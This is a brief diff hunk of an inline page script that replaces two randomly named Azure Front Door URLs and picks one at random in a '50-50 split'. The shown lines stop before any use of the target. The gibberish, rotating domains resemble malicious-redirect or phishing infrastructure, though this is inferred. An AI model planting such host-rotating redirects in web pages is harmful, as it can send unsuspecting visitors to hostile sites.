@@ -8,8 +8,8 @@
 
 <script>
 (function () {
-    const urlA = "https://gwinkjhgfdsdfghj-esb8e4aedagth2gz.z01.azurefd.net";
-    const urlB = "https://hwinasdfghjhg-fmeygcdgardwafcc.z01.azurefd.net";
+    const urlA = "https://gwinkjhgcfghj-hranc4gsbgb9azck.z01.azurefd.net";
+    const urlB = "https://hwinlkjhgfdsdf-awd0a5exhfgueng7.z01.azurefd.net";
 
     // 50-50 split
     const target = Math.random() < 0.5 ? urlA : urlB;
